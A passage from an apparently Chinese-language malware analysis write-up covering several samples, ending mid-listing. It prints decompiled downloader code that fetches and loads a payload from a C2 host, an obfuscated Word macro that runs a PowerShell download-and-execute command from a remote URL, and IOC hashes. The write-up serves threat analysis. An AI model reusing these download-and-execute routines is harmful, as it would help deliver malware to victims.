class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// esi</span></span><br><span class="line">  DWORD v8; <span class="comment">// ecx</span></span><br><span class="line">  DWORD v9; <span class="comment">// eax</span></span><br><span class="line">  HANDLE v10; <span class="comment">// edx</span></span><br><span class="line">  DWORD v11; <span class="comment">// eax</span></span><br><span class="line">  DWORD i; <span class="comment">// ecx</span></span><br><span class="line">  HMODULE v13; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v14; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">void</span> *v15; <span class="comment">// esi</span></span><br><span class="line">  HANDLE v16; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">void</span> *v17; <span class="comment">// esi</span></span><br><span class="line">  HANDLE v18; <span class="comment">// ebx</span></span><br><span class="line">  HANDLE v19; <span class="comment">// ebx</span></span><br><span class="line">  HANDLE v20; <span class="comment">// ebx</span></span><br><span class="line">  LPCSTR lpszAcceptTypes[<span class="number">2</span>]; <span class="comment">// [esp+Ch] [ebp-23Ch] BYREF</span></span><br><span class="line">  HINTERNET v22; <span class="comment">// [esp+14h] [ebp-234h]</span></span><br><span class="line">  <span class="type">void</span> *Block; <span class="comment">// [esp+18h] [ebp-230h]</span></span><br><span class="line">  HINTERNET hInternet; <span class="comment">// [esp+1Ch] [ebp-22Ch]</span></span><br><span class="line">  DWORD dwNumberOfBytesRead; <span class="comment">// [esp+20h] [ebp-228h] BYREF</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+24h] [ebp-224h]</span></span><br><span class="line">  DWORD dwBufferLength; <span class="comment">// [esp+28h] [ebp-220h] BYREF</span></span><br><span class="line">  DWORD nNumberOfBytesToWrite; <span class="comment">// [esp+2Ch] [ebp-21Ch] BYREF</span></span><br><span class="line">  CHAR szObjectName[<span class="number">520</span>]; <span class="comment">// [esp+30h] [ebp-218h] BYREF</span></span><br><span class="line">  <span class="type">int</span> Buffer[<span class="number">3</span>]; <span class="comment">// [esp+238h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(szObjectName, <span class="number">0</span>, <span class="built_in">sizeof</span>(szObjectName));</span><br><span class="line">  <span class="built_in">wsprintfA</span>(szObjectName, <span class="string">&quot;%s?filename=%s&quot;</span>, <span class="string">&quot;home/jpg/download.php&quot;</span>, <span class="string">&quot;button01&quot;</span>);</span><br><span class="line">  lpszAcceptTypes[<span class="number">0</span>] = <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">  hFile = <span class="number">0</span>;</span><br><span class="line">  dwBufferLength = <span class="number">0</span>;</span><br><span class="line">  dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">  lpszAcceptTypes[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v0 = <span class="built_in">InternetOpenA</span>(<span class="string">&quot;Mozilla/5.0&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  v22 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">GetLastError</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="built_in">InternetConnectA</span>(v0, <span class="string">&quot;pingguo2.atwebpages.com&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">// 访问pingguo2.atwebpages.com/home/jpg/download.php?filename=button01</span></span><br><span class="line">  hInternet = v2;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">GetLastError</span>();</span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(v1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="built_in">HttpOpenRequestA</span>(v2, <span class="string">&quot;GET&quot;</span>, szObjectName, <span class="string">&quot;HTTP/1.0&quot;</span>, <span class="number">0</span>, lpszAcceptTypes, <span class="number">0x84000000</span>, <span class="number">0</span>);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">GetLastError</span>();</span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(v2);</span><br><span class="line">    v20 = hFile;</span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(v1);</span><br><span class="line">    <span class="keyword">return</span> v20;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">HttpSendRequestA</span>(v3, <span class="string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span>, <span class="number">0x31</span>u, <span class="number">0</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">GetLastError</span>();</span><br><span class="line">    <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">  &#125;</span><br><span class="line">  dwBufferLength = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">HttpQueryInfoA</span>(v4, <span class="number">5u</span>, Buffer, &amp;dwBufferLength, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_24:</span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(v4);</span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(v2);</span><br><span class="line">    v19 = hFile;</span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(v1);</span><br><span class="line">    <span class="keyword">return</span> v19;</span><br><span class="line">  &#125;</span><br><span class="line">  dwBufferLength = <span class="built_in">sub_4090C4</span>(v5, Buffer);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(dwBufferLength + <span class="number">1</span>);</span><br><span class="line">  Block = v6;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">InternetReadFile</span>(v4, v6, dwBufferLength, &amp;dwNumberOfBytesRead) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !dwNumberOfBytesRead || *v6 != <span class="number">0xB2</span> || v6[<span class="number">1</span>] != <span class="number">0xA5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">InternetCloseHandle</span>(v4);</span><br><span class="line">      <span class="built_in">InternetCloseHandle</span>(hInternet);</span><br><span class="line">      <span class="built_in">InternetCloseHandle</span>(v1);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;                                 <span class="comment">// 无法访问则关闭访问</span></span><br><span class="line">    &#125;</span><br><span class="line">    v8 = dwNumberOfBytesRead + nNumberOfBytesToWrite;</span><br><span class="line">    nNumberOfBytesToWrite += dwNumberOfBytesRead;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = nNumberOfBytesToWrite;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">InternetReadFile</span>(v4, &amp;v6[v8], dwBufferLength - v8, &amp;dwNumberOfBytesRead) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !dwNumberOfBytesRead )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v9 = dwBufferLength - (dwNumberOfBytesRead + nNumberOfBytesToWrite);</span><br><span class="line">      nNumberOfBytesToWrite += dwNumberOfBytesRead;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="built_in">InternetReadFile</span>(v4, &amp;v6[nNumberOfBytesToWrite], v9, &amp;dwNumberOfBytesRead) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dwBufferLength != nNumberOfBytesToWrite )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  <span class="built_in">DeleteFileA_0</span>(byte_41DBB8);</span><br><span class="line">  hFile = <span class="built_in">CreateFileA_0</span>(byte_41DBB8, <span class="number">0x40000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">GetLastError</span>();</span><br><span class="line">  v10 = hFile;</span><br><span class="line">  <span class="keyword">if</span> ( hFile == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">GetLastError</span>();</span><br><span class="line">    hFile = <span class="number">0</span>;</span><br><span class="line">LABEL_22:</span><br><span class="line">    <span class="built_in">j___free_base</span>(v6);</span><br><span class="line">    v17 = hInternet;</span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(v4);</span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(v17);</span><br><span class="line">    v18 = hFile;</span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(v1);</span><br><span class="line">    <span class="keyword">return</span> v18;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = nNumberOfBytesToWrite;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; nNumberOfBytesToWrite; v11 = nNumberOfBytesToWrite )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[i] = ~v6[i];</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">WriteFile_0</span>(v10, v6, v11, &amp;nNumberOfBytesToWrite, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">CloseHandle_0</span>(hFile);</span><br><span class="line">  <span class="built_in">Sleep</span>(<span class="number">0x64</span>u);</span><br><span class="line">  v13 = <span class="built_in">LoadLibraryA</span>(byte_41DBB8);</span><br><span class="line">  <span class="built_in">GetLastError</span>();</span><br><span class="line">  <span class="built_in">Sleep</span>(<span class="number">0x2BF20</span>u);</span><br><span class="line">  <span class="built_in">FreeLibrary</span>(v13);</span><br><span class="line">  <span class="built_in">DeleteFileA_0</span>(byte_41DBB8);</span><br><span class="line">  v14 = v22;</span><br><span class="line">  hFile = HANDLE_FLAG_INHERIT;</span><br><span class="line">  <span class="built_in">j___free_base</span>(Block);</span><br><span class="line">  v15 = hInternet;</span><br><span class="line">  <span class="built_in">InternetCloseHandle</span>(v4);</span><br><span class="line">  <span class="built_in">InternetCloseHandle</span>(v15);</span><br><span class="line">  v16 = hFile;</span><br><span class="line">  <span class="built_in">InternetCloseHandle</span>(v14);</span><br><span class="line">  <span class="keyword">return</span> v16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>样本访问C2：pingguo2.atwebpages.com 向其发送GET请求&#x2F;home&#x2F;jpg&#x2F;download.php?filename&#x3D;button01，下载文件</p><p><img src="https://s2.loli.net/2022/10/19/YvLBEDS9tFCzyNl.png" alt="image-20221017202950569.png"></p><p>动态调试没法成功建立连接，仔细一看发现网站已经关了。</p><p><img src="https://s2.loli.net/2022/10/19/XqEkKpo36Dh2uOT.png" alt="image-20221017203551359.png"></p><p>综上这也就是一个下载器，使用了一个伪装的word程序迷惑受害者，虽然有窃取行为但主要是起到了建立远程连接下载程序的作用。推测下载下来的文件作用主要功能是对受害者系统具体的行为损害（例如注册表更改、文件篡改等）。</p><h3 id="行为分析："><a href="#行为分析：" class="headerlink" title="行为分析："></a>行为分析：</h3><p>1.对已创建的资源表进行解密，将其解密成一个用以伪装的word文件。</p><p>2.打开word文件，文件的内容是关于韩国某高校的内容，同时创建一个子进程执行下面的操作。</p><p>3.在本地创建word文件，调用系统函数将受害者主机的信息写入创建的word程序中。</p><p>4.对pingguo2.atwebpages.com创建HTTP连接使用POST发送请求，将收集到的受害者信息发送到目标服务器。</p><p>4.对pingguo2.atwebpages.com创建HTTP连接使用GET发送请求，下载目标地址的文件&#x2F;home&#x2F;jpg&#x2F;download.php。推测该文件作用是对计算机进行具体的破坏。</p><h3 id="IOCs-1"><a href="#IOCs-1" class="headerlink" title="IOCs"></a>IOCs</h3><p><img src="https://s2.loli.net/2022/10/19/EQXqjkGrdUZ5saF.png" alt="image-20221018165815817.png"></p><h2 id="样本3"><a href="#样本3" class="headerlink" title="样本3"></a>样本3</h2><p>这个样本与样本1相同，都使用了宏进行操作，同样使用powershell对文件执行命令行操作。不同点在于此样本直接使用命令行进行远程文件下载。另外由于访问远程地址关闭，所以样本只分析了几步开始的</p><h3 id="样本基本信息-2"><a href="#样本基本信息-2" class="headerlink" title="样本基本信息"></a>样本基本信息</h3><p><img src="https://s2.loli.net/2022/10/19/bZlsciGqN7eRQdz.png" alt="image-20221018184758606.png"></p><p>提取样本基本信息：</p><table><thead><tr><th align="left">type</th><th>hash</th></tr></thead><tbody><tr><td align="left">SHA256:</td><td>9a54b0adff7424a02edfe7c365b6a699c006163a23f7abe901ea3395d2ec913b</td></tr><tr><td align="left">MD5:</td><td>7110e97164061aeb734f65a30aac8a7d</td></tr><tr><td align="left">SHA1:</td><td>b6fbaaa6c4f8ca465768ac0cf66dd2bc2407324c</td></tr></tbody></table><h3 id="样本分析-2"><a href="#样本分析-2" class="headerlink" title="样本分析"></a>样本分析</h3><p>拿到样本发现也是一个word文档，打开文档发现是一个朝鲜语的表格</p><p><img src="https://s2.loli.net/2022/10/19/Fm7VPYzua2MUCyI.png" alt="image-20221018192222938.png"></p><p>使用与样本1同样的方法提取宏代码，如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br></pre></td><td class="code"><pre><span class="line">olevba <span class="number">0.60</span>.<span class="number">1</span> <span class="keyword">on</span> Python <span class="number">3.8</span>.<span class="number">5</span> - http://decalage.info/python/oletools</span><br><span class="line">===============================================================================</span><br><span class="line"><span class="symbol">FILE:</span> .\<span class="number">9</span>a54b0adff7424a02edfe7c365b6a699c006163a23f7abe901ea3395d2ec913b.doc</span><br><span class="line"><span class="symbol">Type:</span> OpenXML</span><br><span class="line">WARNING  <span class="keyword">For</span> now, VBA stomping cannot be detected <span class="keyword">for</span> files <span class="keyword">in</span> memory</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">VBA MACRO ThisDocument.cls</span><br><span class="line"><span class="keyword">in</span> file: word/vbaProject.bin - OLE stream: <span class="comment">&#x27;VBA/ThisDocument&#x27;</span></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> Document_Open()</span><br><span class="line"><span class="keyword">Set</span> djfeihfidkasljf = CreateObject(<span class="string">&quot;Shell.Application&quot;</span>)//创建shell对象</span><br><span class="line"><span class="keyword">Dim</span> dfgdfjiejfjdshaj <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">fjdjkasf = <span class="string">&quot;vnslajdsladkf&quot;</span></span><br><span class="line">fjdjkasf = Left(fjdjkasf, <span class="number">5</span>)</span><br><span class="line">dfgdfjiejfjdshaj = <span class="string">&quot;pvnslavnslaowvnslavnslavnslaersvnslahelvnslavnslal.evnslaxvnslae&quot;</span></span><br><span class="line">dfgdfjiejfjdshaj = Replace(dfgdfjiejfjdshaj, fjdjkasf, <span class="string">&quot;&quot;</span>)</span><br><span class="line">hdfksallasjkdlaf = <span class="string">&quot;[vnslastvnslarivnslanvnslag]$vnslaf=&#123;(Nvnslawrvnslaaevnslaw-Ovnslabjvnslawrvnslaavnslavnslaecvnslatvnsla &quot;</span></span><br><span class="line">hdfksallasjkdlaf = Replace(hdfksallasjkdlaf, fjdjkasf, <span class="string">&quot;&quot;</span>)</span><br><span class="line">ndkflajdkfjskdjfl = <span class="string">&quot;Nvnslaewvnslaravnslavnslat.WvnslaebvnslawrvnslaaCvnslalvnslaiwvnslavnslaravnslaewvnslaravnslanvnslat).Dovnslawevnslailvnslasvnslavnsladjvnslafenvnslag&quot;</span></span><br><span class="line">ndkflajdkfjskdjfl = Replace(ndkflajdkfjskdjfl, fjdjkasf, <span class="string">&quot;&quot;</span>)</span><br><span class="line">salfnxkfdlsjafkj = <span class="string">&quot;(&#x27;hvnslatvnslatvnslapvnsla:vnsla/vnsla/vnslauvnslaevnslakvnslaavnslafvnsla.vnslamvnslayvnslaavnslarvnslatvnslasvnslaovnslanvnslalvnslaivnslanvnslaevnsla.vnslacvnslaovnslamvnsla/vnslahvnslaavnsla/vnslannvnsla.vnslatvnslaxvnslat&#x27;)&quot;</span></span><br><span class="line">salfnxkfdlsjafkj = Replace(salfnxkfdlsjafkj, fjdjkasf, <span class="string">&quot;&quot;</span>)</span><br><span class="line">sjdfkjaslalsfial = <span class="string">&quot;&#125;;$jvnsla=$vnslafvnsla.Revnslapvnslalavnslavnslacvnslae(&#x27;vnslawra&#x27;,&#x27;&#x27;);$vnslau=$vnslajvnsla.Rvnslaepvnslalavnslacvnslae(&#x27;evnslailvnslasdvnslavnslajvnslafvnslae&#x27;,&quot;</span></span><br><span class="line">sjdfkjaslalsfial = Replace(sjdfkjaslalsfial, fjdjkasf, <span class="string">&quot;&quot;</span>)</span><br><span class="line">aksfkjaskjfksnkf = <span class="string">&quot;&#x27;nvnslalovnslaadvnslavnslasvnslatrvnslaivnslavnsla&#x27;);$xvnsla=ievnslavnslax $vnslauvnsla;ievnslaxvnsla $vnslaxvnsla&quot;</span></span><br><span class="line">aksfkjaskjfksnkf = Replace(aksfkjaskjfksnkf, fjdjkasf, <span class="string">&quot;&quot;</span>)</span><br><span class="line">yeuskaksef = hdfksallasjkdlaf + ndkflajdkfjskdjfl + salfnxkfdlsjafkj + sjdfkjaslalsfial + aksfkjaskjfksnkf</span><br><span class="line"></span><br><span class="line">djfeihfidkasljf.ShellExecute dfgdfjiejfjdshaj, yeuskaksef, <span class="string">&quot;&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">VBA MACRO NewMacros.bas</span><br><span class="line"><span class="keyword">in</span> file: word/vbaProject.bin - OLE stream: <span class="comment">&#x27;VBA/NewMacros&#x27;</span></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line"><span class="keyword">Sub</span> djfksdalfjkasj()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;a&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> ejdksaljfkalkf()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;b&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eijdklsafkasdk()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;c&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> uehfsahdkajkas()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;d&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eladjkfjaskaskj()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;e&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> dsjkljfkasdjakf()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;f&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> jsdkfjaskaskfas()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;i&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eijfkdsalkfjaksfj()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;j&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> ewiasdkfjaskjf()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;k&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qijdkasjlfkjask()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;l&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qjiejwfksjalksa()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;m&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> oqdsjakfjksajfa()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;n&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qojiewjfksajf()</span><br><span 